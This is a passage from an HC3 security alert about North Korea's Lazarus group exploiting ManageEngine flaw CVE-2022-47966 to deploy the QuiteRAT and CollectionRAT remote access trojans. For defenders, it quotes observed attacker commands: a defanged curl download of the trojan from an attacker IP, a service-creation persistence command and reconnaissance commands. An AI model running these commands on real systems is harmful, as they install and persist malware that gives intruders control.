The attackers have been exploiting a vulnerability in ManageEngine products, which\nis tracked as [CVE-2022-47966. This vulnerability was added to CISA’s](https://nvd.nist.gov/vuln/detail/cve-2022-47966) [Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n[Catalog in January 2023. Through this exploit, the attackers are deploying the remote access trojan (RAT)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\nknown as “QuiteRAT.” Security researchers previously identified this malware in February 2023, and it is\nreportedly the successor to the group’s previously used malware “MagicRAT,” which contains many of the\nsame capabilities. Further analysis of this campaign has also shown that the group is using a new malware\ntool called “CollectionRAT,” which appears to operate like most RATs by allowing the attacker to run\narbitrary commands among other capabilities. Both CISA and the FBI have previously warned that these\ntypes of vulnerabilities are common attack methods for malicious actors and can pose a significant risk to\nhealthcare and public health organizations. HC3 strongly encourages organizations to update these\nsystems.\n\n#### Report\nCVE-2022-47966 is a critical vulnerability that affects twenty-four of ManageEngine’s products and allows\nan attacker to perform remote code execution. This vulnerability is exploitable if the SAML single-sign-on is\nor ever has been enabled in the ManageEngine setup. Apprioximately five days after the proof-of-concept\nfor this vulnerability appeared online, North Korean actors began exploiting it. Through this vulnerability,\nthe state sponsored group Lazarus has reportedly been targeting internet backbone infrastructure and\nhealthcare entities in Europe and the United States.\n\nAfter gaining initial access through this vulnerability, the group has been deploying the remote access\ntrojan, QuiteRAT. QuiteRAT is believed to be the successor of the group’s previously-used malware\nMagicRAT, and it contains many of the same capabilities, such as arbitrary command execution. Both\nimplants are built on the Qt framework. Use of the Qt framework makes human analysis more difficult\nwhen compared to other programming languages. The use of Qt is not regularly used in malware\ndevelopment, which makes machine learning and heuristic analysis of it being less reliable. Additionally,\nQuiteRAT also has a significantly smaller file size, going from 18MB to 4MB while still retaining its original\nfunctionality. One of the reasons for the smaller file size is that QuiteRAT lacks the ability to perform\npersistence capabilities on its own, and the hackers must accomplish this task separately.\n\nCisco Talos Observed Persistence Command\nC:\\Windows\\system32\\cmd[.]exe /c sc create WindowsNotification type= own type= interact start= auto\nerror= ignore binpath= cmd /K start c:\\users\\public\\notify[.]exe\n\nThe Lazarus Group was observed using the cURL command to deploy the QuiteRAT binary:\n\nCisco Talo’s Observed cURL Command\ncurl hxxp[://]146[.]4[.]21[.]94/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe\n\n[According to Cisco Talos,](https://blog.talosintelligence.com/lazarus-quiterat/) “…a successful download of the binary leads to the execution of the QuiteRAT\n\n\n-----\n\n# HC3: Sector Alert\n##    September 18, 2023   TLP:CLEAR   Report: 202309181700\n\n\nbinary by the Java process, resulting in the activation of the implant on the infected server. Once the\nimplant starts running, it sends out preliminary system information to its command and control (C2)\nservers, and then waits on the C2 to respond with either a command code to execute or an actual\nWindows command to execute on the endpoint via a child cmd.exe process. Some of the initial commands\nexecuted by QuiteRAT on the endpoint are for reconnaissance.”\n\nCisco Talo’s Observed Commands\nCommand Function\nC:\\windows\\system32\\cmd.exe /c systeminfo | findstr Get logon server name (machine name).

This new threat is believed to be connected to the\nJupiter/EarlyRAT malware family, which has previously been linked to a Lazarus subgroup, Andariel.\nCollectionRAT is also used for gathering metadata, managing files on the infected system, and delivering\nadditional payloads.\n\n|Cisco Talo’s Observed Commands|Col2|\n|---|---|\n|Command|Function|\n|C:\\windows\\system32\\cmd.exe /c systeminfo | findstr Logon|Get logon server name (machine name).
